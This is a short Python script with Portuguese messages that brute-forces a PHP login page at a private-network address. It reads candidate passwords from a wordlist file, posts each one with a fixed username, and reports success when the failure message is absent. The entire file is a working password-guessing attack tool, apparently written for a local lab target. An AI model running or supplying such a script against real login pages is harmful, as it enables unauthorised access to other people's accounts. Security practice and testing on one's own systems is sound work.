import requests
url = "http://192.168.100.4"
login_url = url+"/phplogin/index.html"
arquivo = "senha.txt"
usuario = "teste"

def request(user, password):
    data = {"nome": user, "senha": password}
    r = requests.post(login_url, data=data, allow_redirects=True)
    if "Logue novamente" in r.text:
        print("Nao foi possivel achar a senha!!")
    else:
        print("A senha e: "+user + " | "+ password)

wordlist = open(arquivo, "r")
for i in wordlist:
    print("Testando "+ usuario + " || " + i)
    request(usuario,i)
    print("===============================")